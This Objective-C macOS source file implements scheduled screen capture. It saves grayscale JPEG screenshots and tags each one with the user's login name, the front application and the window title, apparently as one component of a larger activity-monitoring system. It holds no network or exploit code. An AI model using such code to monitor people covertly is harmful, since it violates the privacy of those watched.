//
//  ScreenshotTaker.m
//  ScreenshotCaptureManager
//
//  Created by Makara Khloth on 2/13/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "ScreenshotTaker.h"

#import "SystemUtilsImpl.h"
#import "FxScreenshotEvent.h"
#import "DateTimeFormat.h"
#import "ImageUtils.h"

#import <AppKit/AppKit.h>

@interface ScreenshotTaker (private)
- (void) takeScreenshot: (NSArray *) aArgs;
- (void) captureScreen: (NSTimer *) aTimer;
- (NSString *) screenshotFilePathWithPrefix: (NSString *) aPrefix;
- (void) storeScreenshot: (NSDictionary *) aScreenshotDict;
@end

@implementation ScreenshotTaker

@synthesize mDelegate, mSelector, mThreadA, mScreenshotFolder, mLockScreen, mRunLoopOfScheduleThread;

- (id) initWithScreenshotFolder: (NSString *) aScreenshotFolder {
    self = [super init];
    if (self) {
        mThreadA = [NSThread currentThread];
        self.mScreenshotFolder = aScreenshotFolder;
        [self registerNotificationForSleepMode];
    }
    return (self);
}

- (void) takeScreenshot: (NSInteger) aInterval
               duration: (NSInteger) aDuration
                frameID: (NSUInteger) aFrameID
                 module: (NSInteger) aModule {
    NSNumber *interval = [NSNumber numberWithInteger:aInterval];
    NSNumber *duration = [NSNumber numberWithInteger:aDuration];
    NSNumber *frameID = [NSNumber numberWithUnsignedInteger:aFrameID];
    NSNumber *module = [NSNumber numberWithInteger:aModule];
    
    NSArray *args = [NSArray arrayWithObjects:interval, duration, frameID, module, nil];
    [NSThread detachNewThreadSelector:@selector(takeScreenshot:) toTarget:self withObject:args];
}

- (void) stopTakeScheduleScreenshot {
    if (self.mRunLoopOfScheduleThread) {
        CFRunLoopStop([self.mRunLoopOfScheduleThread getCFRunLoop]);
        self.mRunLoopOfScheduleThread = nil;
    }
}

- (void) takeScreenshot: (NSArray *) aArgs {
    DLog(@"Taking screnshot...");
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    
    if ([[aArgs lastObject] integerValue] == kScreenshotCallingModuleSchedule) {
        self.mRunLoopOfScheduleThread = [NSRunLoop currentRunLoop];
        DLog(@"Schedule thread run loop, %@", self.mRunLoopOfScheduleThread);
    }
    
    @try {
        NSNumber *interval = [aArgs objectAtIndex:0];
        NSMutableArray *args = [NSMutableArray arrayWithArray:aArgs];
        NSNumber *tick = [NSNumber numberWithInteger:1];
        [args addObject:tick];
        NSDictionary *userInfo = [NSDictionary dictionaryWithObject:args forKey:@"args"];
        [NSTimer scheduledTimerWithTimeInterval:[interval integerValue]
                                         target:self
                                       selector:@selector(captureScreen:)
                                       userInfo:userInfo
                                        repeats:NO];
        
        CFRunLoopRun();
    }
    @catch (NSException *exception) {
        DLog(@"Take screenshot exception: %@", exception);
    }
    @finally {
        ;
    }
    
    DLog(@"Take screenshot thread exit!");
    
    [aArgs release];
    [pool release];
}

- (void) captureScreen:(NSTimer *)aTimer {
    NSDictionary *userInfo = [aTimer userInfo];
    NSArray *args = [userInfo objectForKey:@"args"];
    NSNumber *interval = [args objectAtIndex:0];
    NSNumber *duration = [args objectAtIndex:1];
    NSNumber *frameID = [args objectAtIndex:2];
    NSNumber *module = [args objectAtIndex:3];
    NSNumber *tick = [args objectAtIndex:4];
    
    NSInteger order = [tick integerValue];
    NSInteger numberOfTaking = [duration integerValue] / [interval integerValue];
    DLog(@"order: %d, numberOfTaking: %d", (int)order, (int)numberOfTaking);
    
    BOOL done = YES;
    if (++order <= numberOfTaking) {
        tick = [NSNumber numberWithInteger:order];
        NSMutableArray *args2 = [NSMutableArray arrayWithArray:args];
        [args2 replaceObjectAtIndex:4 withObject:tick];
        NSDictionary *userInfo = [NSDictionary dictionaryWithObject:args2 forKey:@"args"];
        [NSTimer scheduledTimerWithTimeInterval:[interval integerValue]
                                         target:self
                                       selector:@selector(captureScreen:)
                                       userInfo:userInfo
                                        repeats:NO];
        done = NO;
    }
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSArray *imageScreenshots = nil;
    if (!self.mLockScreen) {
        imageScreenshots = [SystemUtilsImpl takeScreenshots];
    }
    
    for (int i = 0; i < [imageScreenshots count]; i++) {
        NSString *prefix = [NSString stringWithFormat:@"%ld-%ld-screen%d", [frameID longValue], (long)order, i];
        NSString *screenshotPath = [self screenshotFilePathWithPrefix:prefix];
        NSImage *imageScreenshot = [imageScreenshots objectAtIndex:i];
        NSImage *grayScaleImage = [ImageUtils imageToGreyImage:imageScreenshot];
        
        NSData *imageData = [grayScaleImage TIFFRepresentation];
        
        NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imageData];
        NSDictionary *imageProps = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.1] forKey:NSImageCompressionFactor];
        imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
        [imageData writeToFile:screenshotPath atomically:YES];
        
        FxScreenshotEvent *screenshotEvent = [[FxScreenshotEvent alloc] init];
        [screenshotEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [screenshotEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
        [screenshotEvent setMApplicationID:[SystemUtilsImpl frontApplicationID]];
        [screenshotEvent setMApplicationName:[SystemUtilsImpl frontApplicationName]];
        [screenshotEvent setMTitle:[SystemUtilsImpl frontApplicationWindowTitle]];
        [screenshotEvent setMCallingModule:(FxScreenshotCallingModule)[module integerValue]];
        [screenshotEvent setMFrameID:[frameID unsignedIntegerValue]];
        [screenshotEvent setMScreenshotFilePath:screenshotPath];
        
        NSMutableDictionary *screenshotDict = [NSMutableDictionary dictionary];
        
        // Make sure flag 'done' is notified only for the last iteration
        if (i == ([imageScreenshots count] - 1)) {
            [screenshotDict setObject:[NSNumber numberWithBool:done] forKey:@"done"];
        } else {
            [screenshotDict setObject:[NSNumber numberWithBool:NO] forKey:@"done"];
        }
        [screenshotDict setObject:screenshotEvent forKey:@"event"];
        
        DLog(@"####Send imageScreenshots");
        [self performSelector:@selector(storeScreenshot:) onThread:self.mThreadA withObject:screenshotDict waitUntilDone:NO];
        
        [screenshotEvent release];
    }
    
    if (done) {
        self.mRunLoopOfScheduleThread = nil;
    }
    
    [pool drain];
}

- (NSString *) screenshotFilePathWithPrefix: (NSString *) aPrefix {
    NSString *formatString = @"yyyy-MM-dd_HH-mm-ss-SSS";
    NSDateFormatter *dateFormatter = [[[NSDateFormatter alloc] init] autorelease];
    [dateFormatter setDateFormat:formatString];
    NSString *filePath = [NSString stringWithFormat:@"%@%@_%@.jpg", self.mScreenshotFolder, aPrefix, [dateFormatter stringFromDate:[NSDate date]]];
    return (filePath);
}

- (void) storeScreenshot: (NSDictionary *) aScreenshotDict {
    NSNumber *done = [aScreenshotDict objectForKey:@"done"];
    FxEvent *event = [aScreenshotDict objectForKey:@"event"];
    
    if ([self.mDelegate respondsToSelector:self.mSelector]) {
        [self.mDelegate performSelector:self.mSelector withObject:event withObject:done];
    }
}

#pragma mark - Notification is sleep ? -

-(void) registerNotificationForSleepMode {
    [[[NSWorkspace sharedWorkspace] notificationCenter]addObserver:self selector:@selector(goSleep) name:NSWorkspaceScreensDidSleepNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]addObserver:self selector:@selector(goWake) name:NSWorkspaceScreensDidWakeNotification object:nil];
    [[NSDistributedNotificationCenter defaultCenter] addObserver: self selector:@selector(goSleep) name:@"com.apple.screensaver.didstart" object:nil];
    [[NSDistributedNotificationCenter defaultCenter] addObserver: self selector:@selector(goWake) name:@"com.apple.screensaver.didstop" object:nil];
}

-(void) unRegisterNotificationForSleepMode {
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceScreensDidSleepNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceScreensDidWakeNotification object:nil];
    [[NSDistributedNotificationCenter defaultCenter] removeObserver:self name:@"com.apple.screensaver.didstart" object:nil];
    [[NSDistributedNotificationCenter defaultCenter] removeObserver:self name:@"com.apple.screensaver.didstop" object:nil];
}

-(void)goSleep{
    self.mLockScreen = true;
}

-(void)goWake{
    self.mLockScreen = false;
}

- (void) dealloc {
    [self unRegisterNotificationForSleepMode];
    self.mScreenshotFolder = nil;
    [super dealloc];
}

@end
